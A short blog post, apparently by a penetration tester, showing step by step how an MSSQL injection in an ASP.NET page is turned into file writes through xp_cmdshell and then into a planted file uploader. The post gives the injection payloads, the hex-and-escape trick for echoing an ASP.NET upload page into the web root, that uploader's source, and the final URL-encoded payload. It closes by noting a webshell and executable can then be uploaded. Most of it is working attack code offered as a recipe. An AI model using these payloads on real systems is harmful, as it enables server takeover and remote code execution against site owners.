---
layout: post
title:  "MSSQL Injection to Shell"
date:   2021-09-24 09:17:08 +0100
tags: mssql sqli shell
---

# MSSQL Injection to Shell
![]({{site.url}}/images/MSSQL/main.png){:width="100%"}
<br>Got a link to a SQLi vulnerable page, did a quick check to see the version ..

{% highlight sql %}
http://mssql/sqli.aspx' and 1=@@version -- -
{% endhighlight %}

![]({{site.url}}/images/MSSQL/version.png){:width="100%"}

The page also gave me the full path. So, my next step was to test if `xp_cmdshell` is enabled and the directory is writable.

{% highlight sql linenos %}
http://mssql/sqli.aspx';
exec master..xp_cmdshell 'whoami > C:\path\file.txt'-- -
{% endhighlight %}
<br>
{% highlight bash %}
http://mssql/file.txt
{% endhighlight %}

![]({{site.url}}/images/MSSQL/xp_cmdshell.png)

The directory is writable and xp_cmdshell is enabled but we can't send our 0xUPLOADER directly in xp_cmdshell so I declared some variables and came up with this

{% highlight sql linenos %}
declare @content varchar(8000)
declare @command varchar(8000)
set @content = 0xUPLOADER
set @command = 'echo '+@content+' > C:\path\uploader.aspx'
exec master..xp_cmdshell @command
{% endhighlight %}

<br>and here's a small asp uploader that I found online

{% highlight asp linenos %}
<%@ Page Language="C#" Debug="false" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
<script runat="server">
protected void upl_Click(object sender, EventArgs e)
{try{if (fu.HasFile){fu.SaveAs(Server.MapPath(".") +"\\"+ System.IO.Path.GetFileName(fu.FileName));Response.Write("Success");}}catch{Response.Write("Failed");}}
</script>
<form id="form1" runat="server">
<asp:FileUpload ID="fu" runat="server" />
<asp:Button ID="upl" runat="server" Text="Upload" OnClick="upl_Click" />
</form>
{% endhighlight %}

<br>So just hex the uploader? No, we have to escape the angle brackets `< >` first

{% highlight bash %}
cat uploader.aspx | sed 's/</^</g; s/>/^>/g'
{% endhighlight %}

{% highlight asp linenos %}
^<%@ Page Language="C#" Debug="false" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%^>
^<script runat="server"^>
protected void upl_Click(object sender, EventArgs e)
{try{if (fu.HasFile){fu.SaveAs(Server.MapPath(".") +"\\"+ System.IO.Path.GetFileName(fu.FileName));Response.Write("Success");}}catch{Response.Write("Failed");}}
^</script^>
^<form id="form1" runat="server"^>
^<asp:FileUpload ID="fu" runat="server" /^>
^<asp:Button ID="upl" runat="server" Text="Upload" OnClick="upl_Click" /^>
^</form^>
{% endhighlight %}

<br>and the final payload looked something like this

{% highlight sql linenos %}
http://mssql/sqli.aspx';
declare @content varchar(8000)
declare @command varchar(8000)
set @content = 0xUPLOADER 
set @command = 'echo '%2b@content%2b' > C:\path\uploader.aspx'
exec master..xp_cmdshell @command  -- -
{% endhighlight %}

![]({{site.url}}/images/MSSQL/uploader.png)

Now we can easily upload our webshell and .exe 👀


# $ cat /etc/motd
